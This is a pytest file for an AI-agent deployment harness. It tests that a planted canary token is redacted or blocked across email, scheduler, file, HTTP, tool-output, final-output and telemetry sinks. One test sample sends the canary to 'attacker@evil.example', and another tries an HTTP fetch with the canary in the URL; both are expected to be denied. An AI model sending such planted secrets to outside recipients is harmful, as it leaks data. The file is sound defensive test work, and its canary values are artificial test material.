"""Canary/lure-token multi-sink matrix (P0.13 / P2.5).

Proves a raw lure value cannot leave through any scored/inspectable surface — email, scheduler,
file, http, final output, or telemetry JSONL — while a legitimate action that merely *contains* a
lure still completes (redaction, not denial, when the target/tool is authorized).

The built-in scanner pattern matches the seeded ``HT-…CANARY…`` family, so these tests need no host
registry. A separate test exercises the configured exact-value tier for a differently-shaped lure.
"""

import json

import pytest
from aitw.agent.profile import AgentProfile
from aitw.logging.observation_log import ObservationLog
from aitw.tools.registry import ToolContext

from agent_deployment.bulletin import bulletin_tool, default_bulletin
from agent_deployment.external_effects import EffectPolicy
from agent_deployment.policy import ToolPolicy
from agent_deployment.provider import _build_scanner, _load_private_patterns
from agent_deployment.registry import PolicyRegistry
from agent_deployment.redacting_log import RedactingObservationLog
from agent_deployment.scanner import Scanner
from agent_deployment.telemetry import DeploymentTelemetry

CANARY = "HT-CANARY-7Q2-PLANTED-LURE-DO-NOT-USE"


def _registry(tmp_path, allowed, *, recipients=frozenset(), egress=(), scanner=None):
    ctx = ToolContext(
        tenant_id="tenant_a",
        workspace=tmp_path,
        egress_allowlist=list(egress),
        profile=AgentProfile(
            tenant_id="tenant_a", role="r", working_instructions="w", allowed_tools=allowed
        ),
    )
    telemetry = DeploymentTelemetry()
    reg = PolicyRegistry(
        ctx,
        tool_policy=ToolPolicy(),
        effect_policy=EffectPolicy(allowed_recipients=frozenset(recipients)),
        telemetry=telemetry,
        bulletin_tool=bulletin_tool(default_bulletin()),
        scanner=scanner or Scanner(),
    )
    return reg, ctx, telemetry


# --- per-sink matrix --------------------------------------------------------------------------


def test_email_to_allowed_recipient_redacts_canary_and_still_sends(tmp_path):
    reg, ctx, tel = _registry(tmp_path, ["send_email"], recipients={"c@acme.test"})
    out = reg.call("send_email", {"to": "c@acme.test", "subject": "re", "body": f"FYI {CANARY} thanks"})
    assert out.startswith("MOCK-EMAIL")                 # action completes
    assert ctx.sent_emails and CANARY not in json.dumps(ctx.sent_emails)
    assert tel.count(phase="scanner", outcome="redacted") == 1


def test_email_to_unauthorized_recipient_denied(tmp_path):
    reg, ctx, _ = _registry(tmp_path, ["send_email"], recipients={"c@acme.test"})
    out = reg.call("send_email", {"to": "attacker@evil.example", "subject": "x", "body": CANARY})
    assert out.startswith("DENIED")
    assert ctx.sent_emails == []


def test_scheduler_redacts_canary_before_sink(tmp_path):
    reg, ctx, _ = _registry(tmp_path, ["scheduler"])
    reg.call("scheduler", {"when": "2026-01-01", "title": f"review {CANARY}"})
    assert ctx.scheduled and CANARY not in json.dumps(ctx.scheduled)


def test_file_write_redacts_canary_but_writes(tmp_path):
    reg, ctx, _ = _registry(tmp_path, ["file_io"])
    reg.call("file_io", {"op": "write", "path": "answer.md", "content": f"result {CANARY}"})
    written = (tmp_path / "answer.md").read_text()
    assert CANARY not in written and "result" in written
    assert ctx.file_writes and CANARY not in json.dumps(ctx.file_writes)


def test_http_fetch_with_canary_url_denied(tmp_path):
    reg, ctx, _ = _registry(tmp_path, ["http_fetch"], egress=["http://localhost:8099/"])
    out = reg.call("http_fetch", {"url": f"http://localhost:8099/{CANARY}"})
    assert out.startswith("DENIED")
    assert ctx.fetched == []


def test_tool_output_canary_redacted_before_model(tmp_path):
    # web_search results are untrusted output; a lure in a result is redacted before return.
    reg, ctx, _ = _registry(tmp_path, ["web_search"])
    ctx.search_corpus = {"q": f"see {CANARY} here"}
    out = reg.call("web_search", {"query": "q"})
    assert CANARY not in out


def test_final_output_redaction_via_provider_hook(tmp_path):
    from agent_deployment.provider import AgentDeployment

    dep = AgentDeployment.for_scenario("support_triage")
    ctx = ToolContext(tenant_id="tenant_a", workspace=tmp_path,
                      profile=AgentProfile(tenant_id="tenant_a", role="r", working_instructions="w", allowed_tools=[]))
    cleaned = dep.sanitize_final_output(f"The answer is {CANARY}.", ctx)
    assert CANARY not in cleaned


def test_telemetry_jsonl_scrubs_canary(tmp_path):
    # A denied effect still logs its args; the redacting log must keep the raw lure out of JSONL.
    log = RedactingObservationLog(tmp_path / "t.jsonl", create_new=True, scanner=Scanner())
    log.emit_event(
        tenant="tenant_a", scenario="s", phase="task", step_no=1, outcome="ok",
        tool="send_email", args={"to": "c@acme.test", "body": CANARY}, result="MOCK-EMAIL",
    )
    log.close()
    text = (tmp_path / "t.jsonl").read_text()
    assert CANARY not in text
    # Required tags still present and parseable.
    rec = json.loads(text.splitlines()[0])
    assert rec["tool"] == "send_email" and rec["phase"] == "task"


def test_base_log_would_leak_without_redaction(tmp_path):
    # Contrast: the base ObservationLog does NOT scrub the lure family (only credential shapes).
    log = ObservationLog(tmp_path / "b.jsonl", create_new=True)
    log.emit_event(tenant="t", scenario="s", phase="task", step_no=1, outcome="ok",
                   tool="send_email", args={"body": CANARY})
    log.close()
    assert CANARY in (tmp_path / "b.jsonl").read_text()


# --- configured exact-value tier + fail-closed private config ---------------------------------


def test_configured_exact_value_detected(tmp_path):
    # A differently-shaped lure (not HT-…CANARY…) is caught when supplied as an exact host literal.
    grader_lure = "GRADER-LURE-2026-XYZ"
    scanner = Scanner(extra_literals=frozenset({grader_lure}))
    reg, ctx, _ = _registry(tmp_path, ["scheduler"], scanner=scanner)
    reg.call("scheduler", {"when": "2026-01-01", "title": f"note {grader_lure}"})
    assert grader_lure not in json.dumps(ctx.scheduled)


def test_private_pattern_config_loads(tmp_path):
    cfg = tmp_path / "patterns.txt"
    cfg.write_text("# private\nLURE-[0-9]{4}\n", encoding="utf-8")
    scanner, _status = _build_scanner({"REDACTION_PATTERNS_PATH": str(cfg)})
    assert scanner.redact_text("x LURE-1234 y", surface="telemetry").text == "x [REDACTED] y"


def test_private_pattern_config_fail_closed_when_missing(tmp_path):
    with pytest.raises(OSError):
        _load_private_patterns({"REDACTION_PATTERNS_PATH": str(tmp_path / "nope.txt")})


def test_private_pattern_config_fail_closed_on_bad_regex(tmp_path):
    cfg = tmp_path / "bad.txt"
    cfg.write_text("(unclosed", encoding="utf-8")
    with pytest.raises(Exception):
        _load_private_patterns({"REDACTION_PATTERNS_PATH": str(cfg)})
